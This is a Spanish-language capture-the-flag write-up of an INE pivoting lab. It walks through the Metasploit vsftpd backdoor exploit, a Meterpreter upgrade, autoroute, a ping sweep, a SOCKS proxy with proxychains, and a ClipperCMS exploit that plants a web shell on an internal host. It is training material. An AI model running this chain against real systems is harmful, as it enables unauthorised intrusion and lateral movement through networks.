
# Pivoting con Socks Proxy

## <mark style="color:purple;">Lab: Pivoting</mark> <mark style="color:purple;"></mark><mark style="color:purple;">**IV**</mark>

En este desafío de pivoting, la arquitectura de red es la que se muestra a continuación:

`Kali` -----------> `Objetivo A` -------------> `Objetivo B`

Tu misión es conseguir las flags presentes tanto en el Objetivo A como en el Objetivo B.

&#x20;El Objetivo A debe ser accesible en **demo.ine.local**.

#### ¿Cómo se resuelve esto?

* Metasploit está instalado en la instancia de Kali a la que tendrás acceso.
* Toda explotación puede realizarse utilizando Metasploit y Proxychains con scripts/herramientas de terceros.
* Puedes utilizar otras herramientas además de Nmap para la enumeración.

### Hosts

Sólamente tenemos un objetivo: `demo.ine.local`

```bash
┌──(root㉿INE)-[~]
└─# cat /etc/hosts

127.0.0.1       localhost
::1     localhost ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.1.0.10       INE
127.0.0.1 AttackDefense-Kali
192.202.227.2   INE
192.202.227.2 INE
192.202.227.3 demo.ine.local
```

### Escaneo de puertos

```bash
┌──(root㉿INE)-[~]
└─# nmap -sV demo.ine.local

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.10 (Ubuntu Linux; protocol 2.0)
MAC Address: 02:42:C0:CA:E3:03 (Unknown)
Service Info: Host: Welcome; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tenemos abierto el puerto 22 SSH y el 21 FTP con un servicio vulnerable: `vsftpd 2.0.8`

### Explotación de vsftpd

```bash
msfconsole
msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  auxiliary/dos/ftp/vsftpd_232          2011-02-03       normal     Yes    VSFTPD 2.3.2 Denial of Service
   1  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution

Interact with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > use 1
```

```bash
set rhosts demo.ine.local
exploit

[*] 192.202.227.3:21 - Banner: 220 Welcome to AttackDefense target FTP service.
[*] 192.202.227.3:21 - USER: 331 Please specify the password.
[+] 192.202.227.3:21 - Backdoor service has been spawned, handling...
[+] 192.202.227.3:21 - UID: uid=0(root) gid=0(root) groups=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.202.227.2:44661 -> 192.202.227.3:6200) at 2026-04-14 12:34:52 +0530

whoami
root
```

Estamos dentro y tenemos una shell un poco restrictiva, vamos a cambiar a Meterpreter para tener un mayor control del objetivo.

### Upgrade a Meterpreter

Con `Cntrol+Z` ponemos la sesión en el background, y es tan sencillo hacer el upgrade a Meterpreter como indicarle la sesión con `-u` delante:

```bash
^Z
Background session 2? [y/N]  y
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > sessions -u 1

[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [2]
[*] Upgrading session ID: 2
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.202.227.2:4433 
[*] Sending stage (1017704 bytes) to 192.202.227.3
[*] Meterpreter session 2 opened (192.202.227.2:4433 -> 192.202.227.3:35474) at 2026-04-14 12:40:06 +0530
[*] Command stager progress: 100.00% (773/773 bytes)
```

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > sessions 2
[*] Starting interaction with 3...

meterpreter > getuid
Server username: root
```

### Flag 1

Buscaremos la flag directamente en todo el sistema con el siguiente comando:

```bash
meterpreter > shell

find / -name "*flag*" -type f 2>/dev/null

/usr/lib/perl/5.18.2/bits/waitflags.ph
/usr/lib/python2.7/dist-packages/dns/flags.pyc
/usr/lib/python2.7/dist-packages/dns/flags.py
/usr/include/linux/tty_flags.h
/usr/include/linux/kernel-page-flags.h
/usr/include/x86_64-linux-gnu/asm/processor-flags.h
/usr/include/x86_64-linux-gnu/bits/waitflags.h
/usr/bin/flag1.txt
```

```bash
cat /usr/bin/flag1.txt
6d026e8a09c93a18eca404b8********
```

### Ver redes internas

```powershell
meterpreter > ifconfig

Interface 787006
============
Name         : eth0
Hardware MAC : 02:42:c0:ca:e3:03
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.202.227.3
IPv4 Netmask : 255.255.255.0

Interface 787008
============
Name         : eth1
Hardware MAC : 02:42:c0:56:65:02
MTU          : 1500
Flags        : UP,BROADCAST,MULTICAST
IPv4 Address : 192.86.101.2
IPv4 Netmask : 255.255.255.0
```

Vemos que la red interna a la que no podíamos acceder desde fuera es la: `192.86.101.0/24`

### Autoroute

Usaremos un módulo específico:

```powershell
use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > options

Module options (post/multi/manage/autoroute):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD      autoadd          yes       Specify the autoroute command (Accepted: add, autoadd, print, delete, default)
   NETMASK  255.255.255.0    no        Netmask (IPv4 as "255.255.255.0" or CIDR as "/24"
   SESSION                   yes       The session to run this module on
   SUBNET                    no        Subnet (IPv4, for example, 10.10.10.0)

View the full module info with the info, or info -d command.
```

```bash
set SUBNET 192.86.101.0
msf6 post(multi/manage/autoroute) > set session 2
msf6 post(multi/manage/autoroute) > exploit

[*] Running module against demo.ine.local
[*] Searching for subnets to autoroute.
[+] Route added to subnet 192.86.101.0/255.255.255.0 from host's routing table.
[+] Route added to subnet 192.202.227.0/255.255.255.0 from host's routing table.
[*] Post module execution completed
```

### Ping Sweep

Vamos a encontrar la IP del objetivo en la red interna:

```bash
use post/multi/gather/ping_sweep
set session 2
set rhosts 192.86.101.0/24
exploit

[*] Performing ping sweep for IP range 192.86.101.0/24
[+]     192.86.101.3 host found
[+]     192.86.101.1 host found
[+]     192.86.101.2 host found
```

Encontramos la IP de la máquina objetivo para pivoting: `192.86.101.3`

### Habilitar Socks Proxy

```powershell
msf6 post(multi/manage/autoroute) > search socks

Matching Modules
================

   #  Name                                     Disclosure Date  Rank    Check  Description
   -  ----                                     ---------------  ----    -----  -----------
   0  auxiliary/server/socks_proxy             .                normal  No     SOCKS Proxy Server
   1  auxiliary/server/socks_unc               .                normal  No     SOCKS Proxy UNC Path Redirection
   2  auxiliary/scanner/http/sockso_traversal  2012-03-14       normal  No     Sockso Music Host Server 1.5 Directory Traversal

Interact with a module by name or index. For example info 2, use 2 or use auxiliary/scanner/http/sockso_traversal

msf6 post(multi/manage/autoroute) > use 0
```

#### Ver versión de proxychains por defecto

{% hint style="info" %}
Vemos que usa `socks4` y el puerto `9050` por defecto
{% endhint %}

```bash
cat /etc/proxychains4.conf

<---SNIP--->
# defaults set to "tor"
socks4  127.0.0.1 9050
```

#### Configurar Socks Proxy

```bash
msf6 auxiliary(server/socks_proxy) > set VERSION 4a
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > exploit

[*] Auxiliary module running as background job 1.
[*] Starting the SOCKS proxy server
```

#### Comprobación

```bash
┌──(root㉿INE)-[~]
└─# netstat -antp

Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:4822          0.0.0.0:*               LISTEN      41/guacd            
tcp        0      0 0.0.0.0:9050            0.0.0.0:*               LISTEN      1804/ruby  
```

### Ecaneo de puertos con Proxychains

```bash
┌──(root㉿INE)-[~]
└─# proxychains nmap -sT -Pn 192.86.101.3

[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-04-14 13:01 IST
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.86.101.3:1723 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.86.101.3:143 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.86.101.3:23 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.86.101.3:21 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.86.101.3:256 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.86.101.3:3306  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.86.101.3:22 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.86.101.3:993 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.86.101.3:443 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.86.101.3:80  ...  OK
<----SNIP---->
Nmap scan report for 192.86.101.3
Host is up (0.10s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
3306/tcp open  mysql
```

Encontramos el puerto 80 HTTP abierto y el puerto 3306 MySQL.

### Enumeración web interna

```bash
┌──(root㉿INE)-[~]
└─# proxychains curl http://192.86.101.3:80                                                                                                                    
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.86.101.3:80  ...  OK
<meta http-equiv="refresh"
   content="0; url=/clipper/manager">
```

Encontramos un servicio Clipper Manager.

#### Whatweb

```bash
┌──(root㉿INE)-[~]
└─# proxychains whatweb -v http://192.86.101.3:80
                                                              
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.86.101.3:80  ...  OK
WhatWeb report for http://192.86.101.3:80
[proxychains] Strict chain  ...  127.0.0.1:9050 Status    : 200 OK
 ...  192.86.101.3:80 Title     : <None>

<----SNIP---->
WhatWeb report for http://192.86.101.3/clipper/manager/
Status    : 200 OK
Title     : ClipperCMS Manager Login
IP        : 192.86.101.3
Country   : UNITED STATES, US

Summary   : Apache[2.4.7], Cookies[SN5b374b2575e53], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)], HttpOnly[SN5b374b2575e53], JQuery, PasswordField[password], PHP[5.5.9-1ubuntu4.25], Script[text/javascript], X-Powered-By[PHP/5.5.9-1ubuntu4.25]
```

Vemos que se trata concretamente de un `ClipperCMS` en la ruta `http://192.86.101.3/clipper`

### Búsqueda de exploits

Encontramos un exploit de RCE:

```bash
┌──(root㉿INE)-[~]
└─# searchsploit Clipper CMS                                                                                        
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
ClipperCMS 1.3.0 - Code Execution                                                 | php/remote/38730.py
ClipperCMS 1.3.0 - Multiple SQL Injections                                        | php/webapps/38729.txt
ClipperCMS 1.3.3 - Cross-Site Request Forgery (File Upload)                       | php/webapps/45839.txt
ClipperCMS 1.3.3 - Cross-Site Scripting                                           | php/webapps/44775.txt
---------------------------------------------------------------------------------- ---------------------------------
```

Y nos los descargamos con:

```bash
┌──(root㉿INE)-[~]
└─# searchsploit -m 38730
                                                                                      
  Exploit: ClipperCMS 1.3.0 - Code Execution
      URL: https://www.exploit-db.com/exploits/38730
     Path: /usr/share/exploitdb/exploits/php/remote/38730.py
    Codes: OSVDB-130415
 Verified: False
File Type: Python script, ASCII text executable
Copied to: /root/38730.py
```

### Explotación de Clipper CMS

```bash
┌──(root㉿INE)-[~]
└─# python3 38730.py                                                                                                
usage: python 38730.py http://example.com/ClipperCMS/ admin admin
```

```bash
┌──(root㉿INE)-[~]
└─# proxychains python2 38730.py http://192.86.101.3/clipper/ admin password                                        
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  192.86.101.3:80  ...  OK
successful: login as admin
successful: user is allowed to use file manager. Full path: /app/clipper/
successful: .htaccess upload
successful: shell upload. Execute commands via http://192.86.101.3/clipper/404.png?x=<COMMAND>
successful: shell seems to be working
enter command, or enter exit to quit.

$ whoami
www-data

$ hostname
demo2.ine.local
```

Estamos dentro, pero es una shell restrictiva donde no podemos movernos libremente con `cd`.

### Flag 2

La buscaremos para leerla directamente:

```bash
find / -name "*flag*" -type f 2>/dev/null

/tmp/flag.txt
```

```bash
$ cat /tmp/flag.txt
dbaa3f9b469d1315486ca82d********
```
